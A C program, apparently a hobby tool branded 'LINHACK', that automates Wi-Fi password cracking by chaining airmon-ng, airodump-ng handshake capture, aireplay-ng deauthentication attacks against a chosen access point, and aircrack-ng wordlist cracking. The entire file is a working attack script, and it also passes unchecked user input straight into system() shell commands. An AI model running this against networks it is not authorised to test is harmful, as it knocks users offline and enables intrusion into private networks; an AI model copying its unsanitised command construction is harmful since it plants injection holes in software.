#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
int main(void)
{
	printf("\t██╗░░░░░██╗███╗░░██╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗\n");
	printf("\t██║░░░░░██║████╗░██║██║░░██║██╔══██╗██╔══██╗██║░██╔╝\n");
	printf("\t██║░░░░░██║██╔██╗██║███████║███████║██║░░╚═╝█████═╝░\n");
	printf("\t██║░░░░░██║██║╚████║██╔══██║██╔══██║██║░░██╗██╔═██╗░\n");
	printf("\t███████╗██║██║░╚███║██║░░██║██║░░██║╚█████╔╝██║░╚██╗\n");
	printf("\t╚══════╝╚═╝╚═╝░░╚══╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\n");
	int i, channel, timeout, p;
	char c[20], k[20] = "y", l[20] = "n", interface[20], monitor[20] = "mon", bssid[50], location_store[50], location_file[50], location_wordlist[50], temp[20] = "-01.cap";
	char trap[BUFSIZ], buf[BUFSIZ], airmon[BUFSIZ], airodump[BUFSIZ], aireplay[BUFSIZ], aircrack[BUFSIZ], wait[BUFSIZ];
	system("ifconfig");
	printf("Enter the interface:");
	scanf("%s", interface);
	printf("\n\n");
	system("nmcli dev wifi");
	snprintf(airmon, sizeof(airmon), "airmon-ng start %s", interface);
	system(airmon);
	system("airmon-ng check kill");
	printf("Enter the bssid:");
	scanf("%s", bssid);
	printf("\n\n");
	printf("Enter the channel:");
	scanf("%d", &channel);
	printf("\n\n");
	printf("Enter the location to store the file:");
	scanf("%s", location_store);
	printf("\n\n");
	printf("Set the timeout [0-90]:");
	scanf("%d", &timeout);
	printf("\n\n");
	snprintf(airodump, sizeof(airodump), "timeout -k 1 10s airodump-ng --bssid %s -c %d -w %s %s%s && exit &", bssid, channel, location_store, interface, monitor);
	system(airodump);
	snprintf(aireplay, sizeof(aireplay), "gnome-terminal -- sh -c 'aireplay-ng -0 %d -a %s %s%s'", timeout, bssid, interface, monitor);
	system(aireplay);
	system("wait");
	scanf("%d", &p);
	printf("\n\n");
	fflush(stdout);
	printf("Do you want to use previously captured file? (y for yes / n for no):");
	fflush(stdout);
	scanf("%s", c);
	if (c[0] == k[0])
	{
		printf("Enter the location of the wordlist file:");
		scanf("%s", location_wordlist);
		printf("\n\n");
		snprintf(aircrack, sizeof(aircrack), "aircrack-ng %s%s -w %s", location_store, temp, location_wordlist);
		system(aircrack);
		system("sudo systemctl start NetworkManager");
		snprintf(airmon, sizeof(airmon), "airmon-ng stop %s%s", interface, monitor);
		system(airmon);
	}
	else if (c[0] == l[0])
	{
		printf("Enter the location of the captured file:");
		scanf("%s", location_file);
		printf("\n\n");
		printf("Enter the location of the wordlist file:");
		scanf("%s", location_wordlist);
		printf("\n\n");
		snprintf(aircrack, sizeof(aircrack), "aircrack-ng %s -w %s", location_file, location_wordlist);
		system(aircrack);
		system("sudo systemctl start NetworkManager");
		snprintf(airmon, sizeof(airmon), "airmon-ng stop %s%s", interface, monitor);
		system(airmon);
	}
	else
	{
		printf("Invalid option");
		system("sudo systemctl start NetworkManager");
		snprintf(airmon, sizeof(airmon), "airmon-ng stop %s%s", interface, monitor);
		system(airmon);
	}
	return 0;
}
